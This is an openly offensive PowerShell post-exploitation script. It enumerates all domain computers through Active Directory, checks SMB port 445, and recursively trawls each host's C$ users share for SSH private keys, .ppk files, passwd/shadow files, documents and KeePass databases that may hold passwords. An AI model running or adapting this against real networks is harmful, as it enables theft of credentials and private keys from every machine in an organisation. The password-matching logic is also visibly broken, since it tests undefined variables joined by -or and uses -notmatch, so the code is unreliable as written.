#post exploitation script to find passwords on remote shares.


$OFS = "`n`r`r"
$actived = [ADSI]''
$searcher = new-object System.DirectoryServices.DirectorySearcher($actived)
$searcher.filter = "(objectCategory=computer)"
$searcher.pageSize=1250
$searcher.propertiesToLoad.Add("name")
$computers = $searcher.findall()
clear-host

$computers | ForEach-Object {
    $nextComputer = $_.properties.name[0]
    try
    {
        $socket = New-Object Net.Sockets.TcpClient($nextComputer, 445)
        echo ""
	echo ($nextComputer + " is online. Checking for greppable passwords in files")
        if ($cleartextfiles = get-childitem "\\$nextComputer\c$\users\" -recurse -include shadow,passwd,id_dsa,id_dsa.pub,id_rsa.pub,id_rsa,*.ppk,*.bat,*.xml,*.csv,*.txt -exclude *.conf,*.exe,*.dll,*.com | select-string -notmatch ($password -or $mdp -or $pass -or $passe -or $admin -or $root -or $user -or $username -or $passwd -or $pwd -or $perso))
		{
		    echo "$nextComputer files containing passwords have been found!"
            	    echo "$cleartextfiles"
		    echo ""
        }
        else
        {
            echo "$nextComputer no files containing passwords have been found"
            
        }
  	$socket = New-Object Net.Sockets.TcpClient($nextComputer, 445)
        echo ($nextComputer + " is online. Checking ungreppable files containing passwords")
        if ($Autrefichiers = get-childitem "\\$nextComputer\c$\users\" -recurse -include *.one,*.zip,*.tar.gz,*.rtf,*.dotx,*.docx,*.doc,*.xls,*.xlsx,*.pdf,*.kdb,*.kdbx | Where-Object {$_.Name -match $password -or $mdp -or $pass -or $passe -or $admin -or $root -or $user -or $username -or $passwd -or $pwds -or $perso})
        {
	    	    echo "$nextComputer files containing passwords have been found! " 
            	    echo "$Autrefichiers"
		    echo ""
        }
        else
        {
            echo "$nextComputer no files containing passwords have been found"
        }
      }
    catch 
    {
        echo ($nextComputer + " is offline or not answering on TCP port 445. Skipping.")
    }
}
